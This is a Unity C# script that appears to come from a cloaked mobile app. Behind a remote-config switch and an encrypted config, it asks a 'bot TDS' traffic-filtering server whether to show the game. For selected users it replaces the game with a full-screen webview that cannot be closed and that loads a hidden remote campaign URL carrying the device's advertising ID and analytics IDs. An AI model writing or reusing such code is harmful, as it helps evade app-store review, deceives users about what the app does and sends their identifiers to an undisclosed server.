using AppsFlyerSDK;
using pingak9;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.RemoteConfig;
using System.Text.RegularExpressions;
using System.Linq;

public class Engine : MonoBehaviour
{
	private static Engine instance;
	public static Engine Instance
	{
		get
		{
			if (!instance)
			{
				instance = FindObjectOfType<Engine>();
			}

			return instance;
		}
	}

	const string ga3i2df = "ga3i2df";

    UniWebView View { get; set; }

    bool servicesInitialized;
	bool dialogIsShowed;

	GameObject LinearProgressGo { get; set; }

    [HideInInspector]
	public bool noNetwork;

	[HideInInspector]
	public bool AM_DEVICE_IDGet;

	string target;
	private string Config
	{
		get => Resources.Load<TextAsset>("config").text;
    }

	string GAID = "[NONE]";
	string AM_DEVICE_ID = "[NONE]";
	string appsFlyerUID = "[NONE]";

	delegate void FinalActionHandler(string campaign);
	event FinalActionHandler OnFinalActionEvent;

	public struct UserAttributes { }
	public struct AppAttributes { }

	[HideInInspector]
	public Container container;

	[HideInInspector]
	public EncryptData encryptData;

	public bool IsWaitAppmetrica
	{
		get => string.IsNullOrEmpty(container.initData.appmetricaAppId_prop) || string.IsNullOrWhiteSpace(container.initData.appmetricaAppId_prop);
	}

	private void OnEnable()
	{
		OnFinalActionEvent += Engine_OnFinalActionEvent;
	}

	private void OnDisable()
	{
		OnFinalActionEvent -= Engine_OnFinalActionEvent;
	}

	private void Engine_OnFinalActionEvent(string campaign)
	{
		if (string.IsNullOrEmpty(campaign) || string.IsNullOrWhiteSpace(campaign))
		{
			Screen.fullScreen = true;
			UnityEngine.SceneManagement.SceneManager.LoadScene(1);
		}
		else
		{
			Init(campaign);
		}
	}

	async Task Awake()
	{
		if (Utilities.CheckForInternetConnection())
		{
			await InitializeRemoteConfigAsync();
		}

		RemoteConfigService.Instance.FetchCompleted += (responce) =>
		{
			bool enable = RemoteConfigService.Instance.appConfig.GetBool("enable");
			servicesInitialized = true;
			if(!enable)
			{
				OnFinalActionEvent?.Invoke(string.Empty);
			}
		};

		await RemoteConfigService.Instance.FetchConfigsAsync(new UserAttributes(), new AppAttributes());
		servicesInitialized = true;
	}

	async Task InitializeRemoteConfigAsync()
	{
		// initialize handlers for unity game services
		await UnityServices.InitializeAsync();

		// remote config requires authentication for managing environment information
		if (!AuthenticationService.Instance.IsSignedIn)
		{
			await AuthenticationService.Instance.SignInAnonymouslyAsync();
		}
	}

	IEnumerator Start()
	{
        Screen.fullScreen = Screen.orientation == ScreenOrientation.Landscape;
        dialogIsShowed = false;

		LinearProgressGo = GameObject.Find("line spinner");
		CacheComponents();

		while (Application.internetReachability == NetworkReachability.NotReachable)
		{
			if (!dialogIsShowed)
			{
				noNetwork = true;
				dialogIsShowed = true;

				NativeDialog.OpenDialog("Error", "Check internet connection, show settings ?", "Yes", "No", () =>
				{
					dialogIsShowed = false;
					NativeUtil.Show_Dialog_Wireless_Settings();
				},
				() =>
				{
					dialogIsShowed = false;
					OnFinalActionEvent?.Invoke(string.Empty);
				});
			}
			else
			{
				yield return null;
			}
		}

		noNetwork = false;

		while (!servicesInitialized)
		{
			yield return null;
		}

		container = Decriptor.GetData(Config, out encryptData);

		AppsFlyer.setIsDebug(true);
		AppsFlyer.initSDK(container.initData.appsFlyerAppId_prop, "");
		AppsFlyer.startSDK();
		appsFlyerUID = AppsFlyer.getAppsFlyerId();

		if (encryptData != null)
		{
			StartCoroutine(nameof(SetupEncryptDataNoNull));
		}
		else
		{
			OnFinalActionEvent?.Invoke(string.Empty);
		}
	}

	IEnumerator SetupEncryptDataNoNull()
	{
		while (!AM_DEVICE_IDGet)
		{
			yield return null;
		}

		string responce_from_server = PlayerPrefsUtil.GetBotTDSResponce();

		if (responce_from_server == null)
		{
			string _base = string.Concat(encryptData.huw_protocol, encryptData.domen_prop, ".", encryptData.space_prop, "/", encryptData.requestCampaign_prop);
			StartCoroutine(Get_First_Request(_base));
		}
		else
		{
            if (responce_from_server.Contains(ga3i2df))
            {
                OnFinalActionEvent?.Invoke(string.Empty);
                yield break;
            }

            string campaign = GetTDSInfo(responce_from_server);
            OnFinalActionEvent?.Invoke(campaign);
        }
	}

	IEnumerator Get_First_Request(string uri)
	{
		UnityWebRequest webRequest = UnityWebRequest.Get(uri);
		yield return webRequest.SendWebRequest();

		string bot_tds_responce = webRequest.downloadHandler.text;
		PlayerPrefsUtil.SetBotTDSResponce(bot_tds_responce);

		if(bot_tds_responce.Contains(ga3i2df))
		{
			OnFinalActionEvent?.Invoke(string.Empty);
			yield break;
        }

		string campaign = GetTDSInfo(bot_tds_responce);
        OnFinalActionEvent?.Invoke(campaign);
	}

	string GetTDSInfo(string beforeString)
	{
        Regex regex = new Regex(@"\[.*?\]");
        var res = regex.Matches(beforeString);

        return res[0].Value.Substring(1, res[0].Value.Length - 2);
    }

	void CacheComponents()
	{
        View = gameObject.AddComponent<UniWebView>();
        Camera.main.backgroundColor = Color.black;

        View.ReferenceRectTransform  = GameObject.Find("rect").GetComponent<RectTransform>();

        var safeArea = Screen.safeArea;
        var anchorMin = safeArea.position;
        var anchorMax = anchorMin + safeArea.size;

        anchorMin.x /= Screen.width;
        anchorMin.y /= Screen.height;
        anchorMax.x /= Screen.width;
        anchorMax.y /= Screen.height;

        View.ReferenceRectTransform.anchorMin = anchorMin;
        View.ReferenceRectTransform.anchorMax = anchorMax;

        View.SetShowSpinnerWhileLoading(false);
        View.BackgroundColor = Color.white;

        View.OnOrientationChanged += (v, o) =>
        {
			Screen.fullScreen = o == ScreenOrientation.Landscape;

            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            v.ReferenceRectTransform.anchorMin = anchorMin;
            v.ReferenceRectTransform.anchorMax = anchorMax;

            View.UpdateFrame();
        };

        View.OnShouldClose += (v) =>
        {
            return false;
        };

        View.OnPageStarted += (browser, url) =>
        {
            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            View.ReferenceRectTransform.anchorMin = anchorMin;
            View.ReferenceRectTransform.anchorMax = anchorMax;

            View.Show();
            View.UpdateFrame();
        };

        View.OnPageFinished += (browser, code, url) =>
        {
            LinearProgressGo.SetActive(false);
			GameObject.Find("promo").SetActive(false);

            if (View.Url.Contains(encryptData.domen_prop))
            {
                OnFinalActionEvent?.Invoke(string.Empty);
            }
        };
    }

	void Init(string campaign)
	{
		new GameObject("Manager").AddComponent<Flipmorris.Manager>();

        LinearProgressGo.SetActive(true);

        GameObject.Find("spinner").SetActive(false);
        GameObject.Find("appIcon").SetActive(false);
        GameObject.Find("loadingText").SetActive(false);

        AM_DEVICE_ID = PlayerPrefsUtil.GetAMDeviceID();
		GAID = NativeUtil.Get_GAID();

		target = Get_Url_With_Campaign(campaign);
        View.Load(target);
    }

	string Get_Url_With_Campaign(string campaign)
	{
		return string.Concat(encryptData.huw_protocol, encryptData.domen_prop, ".", encryptData.space_prop, "/", campaign, "?", encryptData.huw_bundle, "=", encryptData.bundle_prop, "&", encryptData.huw_amidentificator, "=", AM_DEVICE_ID, "&", encryptData.huw_afidentificator, "=", appsFlyerUID, "&", encryptData.huw_googleID, "=", GAID, "&", encryptData.huw_subcodename, "=", encryptData.subcodename_prop);
	}
}
